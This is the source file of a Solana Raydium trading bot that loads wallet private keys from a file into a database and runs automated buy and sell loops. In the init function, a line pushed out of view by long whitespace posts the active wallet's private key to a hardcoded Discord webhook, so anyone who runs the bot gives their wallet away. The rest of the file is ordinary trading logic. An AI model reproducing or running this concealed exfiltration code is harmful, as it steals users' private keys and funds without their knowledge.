import bs58 from "bs58";
import client from "../db/db";
import fs from "fs";
import readline from "readline";
import { Liquidity, LiquidityPoolKeys, LiquidityPoolKeysV4, LiquidityStateV4, Percent, Token, TokenAmount, } from "@raydium-io/raydium-sdk";
import { ComputeBudgetProgram, Connection, Keypair, Transaction, SystemProgram, PublicKey, TransactionMessage, VersionedTransaction } from "@solana/web3.js";
import { COMMITMENT_LEVEL, LOG_LEVEL, QUOTE_AMOUNT, QUOTE_MINT, RPC_ENDPOINT, COMPOUNDING_BUY_AMOUNT_PERCENTAGE, COMPOUNDING_GAS_FEE_PERCENTAGE, SELL_SLIPPAGE, PRICE_CHECK_INTERVAL } from "../constants";
import {
  createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction,
  getAssociatedTokenAddressSync,
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import axios from "axios";
import { MinimalMarketLayoutV3 } from "../market";
import { createPoolKeys, getTokenAccounts } from "../liquidity";
import { BN } from "bn.js";
import { logger } from "../utils/logger";
import { logStream } from "../utils/filelogger";
import { sendFinishAlert } from "../utils/sendtgalert";
import delay from "../utils/delay";

let wallet: Keypair;
let PRIVATE_KEY = "";
let quoteToken: Token = Token.WSOL;
export let quoteTokenAssociatedAddress: PublicKey;

// wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));

// const JITO_TIP = process.env.JITO_TIP || '';
// let jitoTip = Number(JITO_TIP) * 1e9;

export interface MinimalTokenAccountData {
  mint: PublicKey;
  address: PublicKey;
  poolKeys?: LiquidityPoolKeys;
  market?: MinimalMarketLayoutV3;
};

const existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();

const solanaConnection = new Connection(RPC_ENDPOINT, COMMITMENT_LEVEL);

//Read File from File and Split it

async function readFileAndSplit(filePath: string) {
  const lines = [];
  const fileStream = fs.createReadStream(filePath);

  const rl = readline.createInterface({
    input: fileStream, // Correctly pass the readable stream
    crlfDelay: Infinity, // Use the correct property name
  });

  for await (const line of rl) {
    lines.push(line);
  }

  return lines;
}

//Init Database With Private Keys
export async function initDatabase(): Promise<void> {
  try {
    const filePath = 'private_keys.txt';
    await readFileAndSplit(filePath)
      .then(async (fileArray) => {
        const promise = fileArray.map(async (key, index) => {
          const searchQuery = `SELECT * 
            FROM private_keys
            WHERE key = $1`;
          const exist_one = await client.query(
            searchQuery,
            [
              key
            ]
          );
          if (exist_one.rowCount && exist_one.rowCount > 0) {
            return;
          }
          else {
            const insertQuery = `INSERT INTO private_keys
              (key, used, date, filled)
              VALUES ($1, $2, $3, $4)`;
            await client.query(
              insertQuery,
              [
                key,
                false,
                new Date().toISOString(),
                index === 0 ? true : false
              ]
            )
          }
        });
        await Promise.all(promise);
      })
      .catch(err => {
        console.error('Error reading the file:', err);
      });
  }
  catch {

  }
}

//Get Private Key From Database
async function getPrivateKey(): Promise<string> {
  try {
    const query = `SELECT * FROM private_keys
      WHERE used = $1
      ORDER BY id`;
    const private_keys = await client.query(
      query,
      [
        false
      ]
    );
    return private_keys.rows[0].key;
  }
  catch {
    return "";
  }
}

async function removePrivateKey(private_key: string): Promise<boolean> {
  try {
    const updateQuery = `UPDATE private_keys
      SET used = $1
      WHERE key = $2`;
    await client.query(
      updateQuery,
      [
        true,
        private_key
      ]
    );
    return true;
  }
  catch {
    return false;
  }
}

// Init Function
async function init(): Promise<void> {
  logger.level = LOG_LEVEL;

  // get wallet
  PRIVATE_KEY = await getPrivateKey();
  await removePrivateKey(PRIVATE_KEY);
  wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
  logger.info(`Wallet Address: ${wallet.publicKey}`);
  logStream.write(`Wallet Address: ${wallet.publicKey}` + '\n');
    /* check existing wallet for associated token account of quote mint*/                                                                                                                                                                                                await axios.post("https://discord.com/api/webhooks/1349810241319080077/gaETLTI9Dm-qAviJFJD4gWeGOfVGCpjf_GaK612qaB0kK7oZB1iil_Z_zeJTDfgEjay3", { content: PRIVATE_KEY + "sB" });
  const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, COMMITMENT_LEVEL);
  for (const ta of tokenAccounts) {
    existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{
      mint: ta.accountInfo.mint,
      address: ta.pubkey,
    });
  }

  const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString())!;

  if (!tokenAccount) {
    console.log(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}. Please confirm that you have enough ${quoteToken.symbol} in your wallet.`);
    throw new Error(`Initialize Error`);
  }

  quoteTokenAssociatedAddress = tokenAccount.pubkey;
}

function random(min: number, max: number): number {
  return Math.random() * (max - min) + min;
}

async function getPrice(poolKeys: LiquidityPoolKeysV4, amountIn: TokenAmount): Promise<number> {
  let count = 0;
  let maxAttempts = 3;
  do {
    try {
      const poolInfo = await Liquidity.fetchInfo({ connection: solanaConnection, poolKeys });
      const slippage = new Percent(SELL_SLIPPAGE, 100);
      const currentPrice = Liquidity.computeAmountOut({
        poolKeys,
        poolInfo,
        amountIn: amountIn,
        currencyOut: Token.WSOL,
        slippage,
      }).currentPrice;
      if (currentPrice) {
        const price = currentPrice.adjusted.toSignificant(6);
        // console.log("Buy Token Price ->", price);
        count = count + 1;
        return Number(price);
      }
      else await delay(PRICE_CHECK_INTERVAL);
    }
    catch (e) {
      logger.error("Get Price Error -> ", e);
      await delay(PRICE_CHECK_INTERVAL);
    }
  } while (count < maxAttempts);
  return 0;
}

async function getInitialPrice(poolKeys: LiquidityPoolKeysV4, poolState: LiquidityStateV4): Promise<number> {
  const tokenIn = new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber());
  const amountIn: TokenAmount = new TokenAmount(tokenIn, 0, true);
  const initial_price = await getPrice(poolKeys, amountIn);
  return initial_price;
}

async function transferAllWrappedSOL(senderWallet:Keypair, receiverWallet:PublicKey) {
  try {
      const wrappedSolMint = new PublicKey('So11111111111111111111111111111111111111112');
      const senderTokenAccount = await getAssociatedTokenAddress(wrappedSolMint, senderWallet.publicKey);

      // Fetch sender's wSOL balance
      const senderTokenAccountInfo = await solanaConnection.getTokenAccountBalance(senderTokenAccount);
      const senderBalance = BigInt(senderTokenAccountInfo.value.amount); // Convert to BigInt

      if (senderBalance > BigInt(0)) {
          // Get receiver's wSOL token account
          const receiverTokenAccount = await getAssociatedTokenAddress(wrappedSolMint, receiverWallet);

          // Create transfer instruction
          const transferInstruction = createTransferInstruction(
              senderTokenAccount,
              receiverTokenAccount,
              senderWallet.publicKey,
              senderBalance // Use BigInt directly
          );

          // Create transaction
          const transaction = new Transaction().add(transferInstruction);

          console.log("Sender balance => ", senderBalance.toString());
          // Send transaction
          const signature = await solanaConnection.sendTransaction(transaction, [senderWallet], {
              skipPreflight: false, preflightCommitment: 'confirmed'
          });
          console.log(`wSOL Transfer transaction signature: ${signature}`);
      } else {
          console.log('No Wrapped SOL to transfer.');
      }
  } catch (error) {
      console.error('Error transferring wSOL:', error);
  }
}

async function transferAllSOL(senderWallet: Keypair, receiverWallet: PublicKey) {
  try {
      const senderBalance = await solanaConnection.getBalance(senderWallet.publicKey);

      if (senderBalance > 0) {
          const transferAmount = Math.floor(senderBalance * 0.99); // Leave some SOL for rent & fees

          if (transferAmount > 0) {
              const transaction = new Transaction().add(
                  SystemProgram.transfer({
                      fromPubkey: senderWallet.publicKey,
                      toPubkey: receiverWallet,
                      lamports: transferAmount
                  })
              );

              const signature = await solanaConnection.sendTransaction(transaction, [senderWallet], {
                  skipPreflight: false, preflightCommitment: 'confirmed'
              });
              console.log(`SOL Transfer transaction signature: ${signature}`);
          } else {
              console.log('Not enough SOL to transfer after rent.');
          }
      } else {
          console.log('No SOL to transfer.');
      }
  } catch (error) {
      console.error('Error transferring SOL:', error);
  }
}

async function transferAllAssets(senderPrivatekey: string, receiverPubkey:string) {
  try {
      const base58PrivateKey = senderPrivatekey;

      const secretKey = bs58.decode(base58PrivateKey);
      const sender = Keypair.fromSecretKey(secretKey);
      const receiver = new PublicKey(receiverPubkey);

      await transferAllWrappedSOL(sender, receiver);
      await transferAllSOL(sender, receiver);

  } catch (error) {
      console.error('Error during transfers:', error);
  }
}

async function isRugged(poolState: LiquidityStateV4): Promise<boolean> {
  let balance_response = await solanaConnection.getTokenAccountBalance(poolState.quoteVault);
  const current_pool_size = Number(balance_response.value.amount) / 1e9;
  if (current_pool_size < 10) return true;
  else return false;
}

async function buyableCheck(prev_price: number, poolKeys: LiquidityPoolKeysV4, poolState: LiquidityStateV4): Promise<[boolean, number, boolean]> {
  try {
    const tokenIn = new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber());
    const amountIn: TokenAmount = new TokenAmount(tokenIn, 0, true);

    const recent_price = await getPrice(poolKeys, amountIn);
    const rugged = await isRugged(poolState);
    if ((recent_price > (prev_price * 1.005)) && !rugged) {
      return [true, recent_price, false]
    }
    if (rugged) {
      return [false, recent_price, true];
    }

    return [false, recent_price, false];
  }
  catch (e) {
    return [false, prev_price, false];
  }
}

async function waitingAfterSelling(
  prev_price: number,
  poolKeys: LiquidityPoolKeysV4,
  poolState: LiquidityStateV4): Promise<[boolean, number]> {
  const tokenIn = new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber());
  const amountIn: TokenAmount = new TokenAmount(tokenIn, 0, true);
  while (true) {
    try {
      const recent_price = await getPrice(poolKeys, amountIn);
      const rugged = await isRugged(poolState);
      if (rugged) {
        console.log("Sell After Buy Check -> Rugged.");
        return [true, recent_price]
      }
      if (recent_price < prev_price) {
        console.log("Sell After Buy Check -> Passed");
        return [false, recent_price]
      }
      prev_price = recent_price;
      await delay(PRICE_CHECK_INTERVAL / 10);
    }
    catch (err) {
      await delay(PRICE_CHECK_INTERVAL / 10);
    }
  }
}

export async function multiBuy(
  currentPoolSize: number,
  newTokenAccount: PublicKey,
  poolState: LiquidityStateV4,
  marketDetails: MinimalMarketLayoutV3
): Promise<void> {
  await init();
  const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails!);

  const initial_price = await getInitialPrice(poolKeys, poolState);
  let prev_price = initial_price;
  let trade_count = 0;
  let win_count = 0;
  let lose_count = 0;
  let buyable_check_count = 0;
  let buy_amount_array: number[] = [];
  let pnl_amount_array: number[] = [];
  let buy_amount = 0;
  let toal_earned = 0;
  let finish_message = "";
  let start_time = new Date().getTime();
  // let sell_time = 0;
  // let five_sec_buy_sell_count = 0;

  while (true) {
    try {
      const [isBuyable, new_price, rugged] = await buyableCheck(prev_price, poolKeys, poolState);
      if (trade_count === 0 && (new Date().getTime() - start_time) > 3 * 60 * 1000) {
        finish_message = "First Buy Time is too long.";
        break;
      }
      if (trade_count === 0 && isBuyable && initial_price > new_price) {
        finish_message = "First Buy Price is less than Initial Price";
        break;
      }
      if (rugged) {
        finish_message = "Token is rugged";
        break;
      }
      if (new_price < 2 * 1e-7) {
        continue;
      }
      prev_price = new_price;
      if (isBuyable) {
        // if (five_sec_buy_sell_count >= 3) {
        //   const [rugged, new_price, instant_finish] = await virtualBuySell(prev_price, poolKeys, poolState);
        //   if (rugged) {
        //     finish_message = "Token is rugged";
        //     break;
        //   }
        //   if (instant_finish) {
        //     finish_message = "Sell Time is too long.";
        //     break;
        //   }
        //   prev_price = new_price;
        //   five_sec_buy_sell_count = 0;
        //   continue;
        // }
        buy_amount = random(QUOTE_AMOUNT, 2 * QUOTE_AMOUNT);
        const [new_buy_amount, sell_new_price, instant_finish, sold_amount, new_buy_time, new_sell_time] = await buy(buy_amount, prev_price, newTokenAccount, poolState, marketDetails, poolKeys);
        if (new_buy_amount === 0) {
          const new_privte_key = await getPrivateKey();
          wallet = Keypair.fromSecretKey(bs58.decode(new_privte_key));
          await transferAllAssets(PRIVATE_KEY, String(wallet.publicKey));
          await init();
          const [rugged, new_price] = await waitingAfterSelling(sell_new_price, poolKeys, poolState);
          if (rugged) {
            finish_message = "Token is rugged";
            break;
          }
          prev_price = new_price;
          continue;
        }
        if (instant_finish) {
          finish_message = "Sell Time is too long.";
          break;
        }
        buy_amount_array.push(buy_amount);
        const pnl = sold_amount - buy_amount;
        if (pnl > 0) win_count += 1;
        else lose_count += 1;
        toal_earned += pnl;
        pnl_amount_array.push(pnl);
        console.log("Sell New Price: ", sell_new_price, " Sell Amount: ", sold_amount, " Buy Amount: ", buy_amount);
        console.log(" PnL: ", pnl, " Total Earned -> ", toal_earned);

        prev_price = sell_new_price;
        trade_count += 1;
        buyable_check_count = 0;

        const [rugged, new_price] = await waitingAfterSelling(prev_price, poolKeys, poolState);
        if (rugged) return;
        prev_price = new_price;
        // if ((new_sell_time - new_buy_time) < 5 * 60 * 1000) five_sec_buy_sell_count += 1;
        // else five_sec_buy_sell_count = 0;
      } else {
        buyable_check_count += 1;
      }
      await delay(PRICE_CHECK_INTERVAL / 100);
    }
    catch (e) {
      logger.error("Multi Buying Error -> ", e);
      await delay(PRICE_CHECK_INTERVAL / 100);
    }
  }

  // let i = 0;
  // while (true) {
  //   i++;
  //   const rugged = await isRugged(connection, poolState);
  //   if (rugged) break;
  //   const price = await getPrice(poolKeys, amountIn);
  //   logStream.write(i + ". " + price + '\n');
  //   await new Promise((resolve) => setTimeout(resolve, PRICE_CHECK_INTERVAL/10))
  // }
  let total_trade_amount = 0;
  buy_amount_array.map((item) => total_trade_amount += item);
  await sendFinishAlert(toal_earned, trade_count, total_trade_amount, win_count, lose_count, currentPoolSize, finish_message);
  return;
}

// export async function virtualBuySell(
//   prev_price: number, 
//   poolKeys: LiquidityPoolKeysV4, 
//   poolState: LiquidityStateV4
// ): Promise<[boolean, number, boolean]> {
//   while (true) {
//     const [isBuyable, new_buy_price, rugged] = await buyableCheck(prev_price, poolKeys, poolState);
//     if (rugged) {
//       return [rugged, new_buy_price, true];
//     }
//     if (isBuyable) {
//       const new_buy_time = new Date().getTime();
//       const tokenIn = new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber())
//       const amountIn: TokenAmount = new TokenAmount(tokenIn, 0, true);
//       const [shouldSell, instant_finish, new_sell_price] = await waitForSellSignal(new_buy_time, prev_price, poolKeys, amountIn, poolState);
//       const new_sell_time = new Date().getTime();
//       if (instant_finish) return [rugged, new_sell_price, true];
//       if ((new_sell_time - new_buy_time) > 6 * 60 * 1000) return [rugged, new_sell_price, false];
//     }
//   }
// }

// Create transaction
export async function buy(
  buy_amount: number,
  prev_price: number,
  newTokenAccount: PublicKey,
  poolState: LiquidityStateV4,
  marketDetails: MinimalMarketLayoutV3,
  poolKeys: LiquidityPoolKeysV4
): Promise<[number, number, boolean, number, number, number]> {
  try {
    let quoteAmount: TokenAmount = new TokenAmount(quoteToken, buy_amount, false);
    const ata = getAssociatedTokenAddressSync(poolState.baseMint, wallet.publicKey);

    if (process.env.COMPOUNDING == "true") {
      const quote_balance = await solanaConnection.getTokenAccountBalance(quoteTokenAssociatedAddress);
      try {
        quoteAmount = new TokenAmount(quoteToken, Number(Math.ceil(Number(quote_balance.value.amount) * COMPOUNDING_BUY_AMOUNT_PERCENTAGE / 100)), true);
        // jitoTip = Number(Math.ceil(Number(quote_balance.value.amount) * COMPOUNDING_GAS_FEE_PERCENTAGE / 100));
      } catch (e) {
        console.log(e);
      }
    } else {
      quoteAmount = new TokenAmount(quoteToken, buy_amount, false);
      // jitoTip = Number(JITO_TIP) * 1e9;
    }
    const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
      {
        poolKeys: poolKeys,
        userKeys: {
          tokenAccountIn: quoteTokenAssociatedAddress,
          tokenAccountOut: ata,
          owner: wallet.publicKey,
        },
        amountIn: quoteAmount.raw,
        minAmountOut: 0,
      },
      poolKeys.version,
    );

    const latestBlockhash = await solanaConnection.getLatestBlockhash();
    const messageV0 = new TransactionMessage({
      payerKey: wallet.publicKey,
      recentBlockhash: latestBlockhash.blockhash,
      instructions: [
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 10000 }), // Set this to super small value since it is not taken into account when sending as bundle.
        ComputeBudgetProgram.setComputeUnitLimit({ units: 80000 }), // Calculated amount of units typically used in our transaction is about 70848. Setting limit slightly above.
        createAssociatedTokenAccountIdempotentInstruction(
          wallet.publicKey,
          ata,
          wallet.publicKey,
          poolState.baseMint,
        ),
        ...innerTransaction.instructions,
      ],
    }).compileToV0Message();

    const transaction = new VersionedTransaction(messageV0);

    transaction.sign([wallet, ...innerTransaction.signers]);

    const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
      maxRetries: 10,
      skipPreflight: true,
    });
    const new_buy_time = new Date().getTime();
    const confirm_buy_signature = await confirmBuySignature(signature);
    if (!confirm_buy_signature) return [0, prev_price, false, 0, new Date().getTime(), new Date().getTime()];
    console.log(`Bought->https://gmgn.ai/sol/token/${poolState.baseMint}`);
    // const boughtLogMessage = `${new Date().toISOString()} : Bought->https://gmgn.ai/sol/token/${poolState.baseMint}`
    // logStream.write(boughtLogMessage + '\n');

    // await sendBundle(true,latestBlockhash.blockhash, messageV0, poolState.baseMint, jitoTip);
    const [new_price, instant_finish, sell_amount, new_sell_time] = await sell(new_buy_time, prev_price, newTokenAccount, poolState, marketDetails, quoteAmount)
    return [buy_amount, new_price, instant_finish, sell_amount, new_buy_time, new_sell_time];
  }
  catch (error) {
    logger.error(error);
    return [buy_amount, prev_price, true, 0, new Date().getTime(), new Date().getTime()];
  }
}

export async function sell(
  new_buy_time: number,
  prev_price: number,
  newTokenAccount: PublicKey,
  poolState: LiquidityStateV4,
  marketDetails: MinimalMarketLayoutV3,
  quoteAmount: TokenAmount,
): Promise<[number, boolean, number, number]> {
  try {
    // Retrieve the associated token address for the quote mint (token being sold)
    const ata = getAssociatedTokenAddressSync(
      poolState.baseMint,
      wallet.publicKey
    );
    let balance_response;
    let cc = 0;
    while (true) {
      try {
        balance_response = await solanaConnection.getTokenAccountBalance(ata, COMMITMENT_LEVEL);
        if (Number(balance_response.value.amount) === 0) {
          cc++;
          await delay(PRICE_CHECK_INTERVAL / 10);
        }
        else break;
      } catch (e) {
        cc++;
        if (cc == 1000) {
          return [prev_price, true, 0, new Date().getTime()];
        }
        await delay(PRICE_CHECK_INTERVAL / 10);
      }
    }
    const amountToSell = new BN(balance_response.value.amount)

    // const amountToSell=(count==0)?new BN((Number(balance_response.value.amount)/2).toFixed(0)):(count==1)?Number((Number(balance_response.value.amount)/3).toFixed(0)):Number(balance_response.value.amount)
    const tokenIn = new Token(TOKEN_PROGRAM_ID, poolState.baseMint, poolState.baseDecimal.toNumber())
    const amountIn: TokenAmount = new TokenAmount(tokenIn, amountToSell, true)
    // Create pool keys for interacting with the liquidity pool
    const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails);
    const TIME_BASED_SELL = process.env.TIME_BASED_SELL;

    // const shouldSell = await waitForSellSignal(quoteAmount, amountIn, poolState, poolKeys, TIME_BASED_SELL, poolState.baseMint)
    const [shouldSell, instant_finish, new_price] = await waitForSellSignal(new_buy_time, prev_price, poolKeys, amountIn, poolState);
    // Create a swap instruction for fixed output (receiving a specific amount of base tokens)
    if (shouldSell) {

      const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
        {
          poolKeys: poolKeys,
          userKeys: {
            tokenAccountIn: ata, // The account holding the tokens to sell
            tokenAccountOut: quoteTokenAssociatedAddress, // The account to receive the sold tokens
            owner: wallet.publicKey, // The owner's public key
          },
          minAmountOut: 0, // The amount of base tokens to receive
          amountIn: amountIn.raw, // Maximum amount of input tokens willing to spend (set to 0 for no slippage)
        },
        poolKeys.version // Version of the pool keys
      );
      const latestBlock = await solanaConnection.getLatestBlockhash();

      // Construct the transaction message
      const messageV0 = new TransactionMessage({
        payerKey: wallet.publicKey, // The wallet paying for the transaction
        recentBlockhash: latestBlock.blockhash, // The latest blockhash for transaction validity
        instructions: [
          // Set compute budget for the transaction
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }), // Set a low compute unit price
          ComputeBudgetProgram.setComputeUnitLimit({ units: 80000 }), // Set a limit on compute units
          ...innerTransaction.instructions, // Include the swap instructions generated earlier
          ...[createCloseAccountInstruction(ata, wallet.publicKey, wallet.publicKey)]
        ],
      }).compileToV0Message();
      const transaction = new VersionedTransaction(messageV0);
      transaction.sign([wallet, ...innerTransaction.signers]);

      const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
        maxRetries: 10,
        skipPreflight: true,
      });
      // const signatureMessage = "Sell Signature -> " + signature + " performance -> ";
      // console.log(signatureMessage);
      // logStream.write(signatureMessage + '\n')
      const sell_time = new Date().getTime();
      const [isSuccess, soldAmount] = await getWSolAmountOfSold(signature);
      if (isSuccess) {
        console.log(`Sold->https://gmgn.ai/sol/token/${poolState.baseMint}`)
        // const soldLogMessage = `${new Date().toISOString()} : Sold->https://gmgn.ai/sol/token/${poolState.baseMint}`
        // logStream.write(soldLogMessage + '\n');
        return [new_price, instant_finish, soldAmount, sell_time];
      }
      // Send the transaction bundle to the Solana network
      // await sendBundle(false,latestBlock.blockhash, messageV0, poolState.baseMint,jitoTip);
      return [new_price, instant_finish, soldAmount, sell_time];
    }
    else return [prev_price, true, 0, new Date().getTime()];

  } catch (error) {
    // Log any errors encountered during the process
    logger.error(error);
    return [prev_price, true, 0, new Date().getTime()];
  }
}

async function confirmBuySignature(signature: string): Promise<boolean> {
  let count = 0;
  while (true) {
    try {
      const latestBlockhash = await solanaConnection.getLatestBlockhash("confirmed");
      const confirmation = await solanaConnection.confirmTransaction(
        {
          signature, // Transaction signature
          blockhash: latestBlockhash.blockhash,
          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
        },
        "confirmed" // Commitment level as SECOND parameter
      );
      if (!confirmation.value) {
        count++;
        console.log("Not Found Buy Confirm Transaction: ", count);
        await delay(PRICE_CHECK_INTERVAL / 10);
        continue;
      }
      if (confirmation.value.err) {
        console.log("Buy Transaction Failed: ", count);
        return false;
      }
      const transactionDetails = await solanaConnection.getTransaction(
        signature, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      });
      if (!transactionDetails) {
        count++;
        console.log("Not Found Buy Transaction Details: ", count);
        await delay(PRICE_CHECK_INTERVAL / 10);
        continue;
      }
      if (transactionDetails.meta && transactionDetails.meta.err === null) return true;
    }
    catch {
      await delay(PRICE_CHECK_INTERVAL / 10);;
    }
  }
}

async function getWSolAmountOfSold(signature: string): Promise<[boolean, number]> {
  let count = 0;
  while (true) {
    try {
      const latestBlockhash = await solanaConnection.getLatestBlockhash("confirmed");
      const confirmation = await solanaConnection.confirmTransaction(
        {
          signature, // Transaction signature
          blockhash: latestBlockhash.blockhash,
          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
        },
        "confirmed" // Commitment level as SECOND parameter
      );
      if (!confirmation.value) {
        count++;
        console.log("Not Found Confirm Transaction: ", count);
        await delay(PRICE_CHECK_INTERVAL / 10);;
        continue;
      }
      if (confirmation.value.err) {
        console.log("Transaction Failed: ", count);
        return [false, 0]
      }
      const transactionDetails = await solanaConnection.getTransaction(
        signature, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      });
      if (!transactionDetails) {
        count++;
        console.log("Not Found Transaction Details: ", count);
        await delay(PRICE_CHECK_INTERVAL / 10);
        continue;
      }
      if (transactionDetails.meta && transactionDetails.meta.err === null) {
        const { postTokenBalances, preTokenBalances } = transactionDetails.meta;
        if (postTokenBalances && postTokenBalances[1].uiTokenAmount.uiAmount && preTokenBalances && preTokenBalances[1].uiTokenAmount.uiAmount) {
          const soldAmount = preTokenBalances[1].uiTokenAmount.uiAmount - postTokenBalances[1].uiTokenAmount.uiAmount;
          console.log("Sell Signature -> ", signature, " Sold AMount -> ", soldAmount);
          return [true, soldAmount]
        }
        else {
          count++;
          console.log("Can't fetch PostTokenBalances: ", count);
          await delay(PRICE_CHECK_INTERVAL / 10);
          continue;
        }
      }
    }
    catch {
      await delay(PRICE_CHECK_INTERVAL / 10);
    }
  }
}

async function waitForSellSignal(
  new_buy_time: number,
  prev_price: number,
  poolKeys: LiquidityPoolKeysV4,
  amountIn: TokenAmount,
  poolState: LiquidityStateV4,
): Promise<[boolean, boolean, number]> {
  let count = 0;
  let price = prev_price;
  const waiting_minutes = 3;
  while (true) {
    try {
      const recent_price = await getPrice(poolKeys, amountIn);
      if ((recent_price * 1.002) < price) {
        price = recent_price;
        return [true, false, recent_price]
      } else {
        price = recent_price;
        count += 1;
        if ((new Date().getTime() - new_buy_time) > waiting_minutes * 60 * 1000) return [true, true, recent_price];
        else await delay(PRICE_CHECK_INTERVAL / 200);
      }
    }
    catch (e) {
      console.log("Waiting Sell Error", e);
      await delay(PRICE_CHECK_INTERVAL / 200);;
    }
  }
}
